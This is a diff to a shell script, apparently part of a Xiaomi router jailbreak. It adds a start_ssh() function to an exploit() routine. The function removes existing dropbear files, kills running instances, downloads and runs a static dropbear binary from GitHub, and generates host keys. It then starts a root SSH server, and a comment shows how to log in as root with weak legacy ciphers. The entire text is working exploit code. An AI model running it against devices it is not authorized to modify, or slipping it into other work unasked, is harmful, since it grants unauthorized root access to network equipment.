@@ -17,11 +17,44 @@ ping_chk()
     fi
 }
 
+start_ssh() {
+    cd /tmp
+
+    # Clean
+    rm -rf dropbear
+    rm -rf dropbear.tar.bz2
+    rm -rf /etc/dropbear
+
+    # kill/stop dropbear, in case it is running from a previous execution
+    pgrep dropbear | xargs kill || true
+
+    # Donwload dropbear static mipsel binary
+    curl -L "https://github.com/acecilia/OpenWRTInvasion/raw/master/script_tools/dropbearStaticMipsel.tar.bz2" --output dropbear.tar.bz2
+    mkdir dropbear
+    /tmp/busybox tar xvfj dropbear.tar.bz2 -C dropbear --strip-components=1
+
+    # Add keys
+    # http://www.ibiblio.org/elemental/howto/dropbear-ssh.html
+    mkdir -p /etc/dropbear
+    cd /etc/dropbear
+    /tmp/dropbear/dropbearkey -t rsa -f dropbear_rsa_host_key
+    /tmp/dropbear/dropbearkey -t dss -f dropbear_dss_host_key
+
+    # Start SSH server
+    /tmp/dropbear/dropbear
+
+    # https://unix.stackexchange.com/a/402749
+    # Login with ssh -oKexAlgorithms=+diffie-hellman-group1-sha1 -c 3des-cbc root@192.168.0.21
+}
+
 exploit() {
     echo "Start download Danbi FW..." > /tmp/script_debug
 
     ping_chk "8.8.8.8"
     ping_chk "https://fwdown.s3.ap-northeast-2.amazonaws.com"
+
+    start_ssh
+    echo $? >> /tmp/script_debug
 
     scp "~/work/dev/firmware/mir4ag-V2.3.5.bin" "root@192.168.31.1:/tmp/"
     echo $? >> /tmp/script_debug
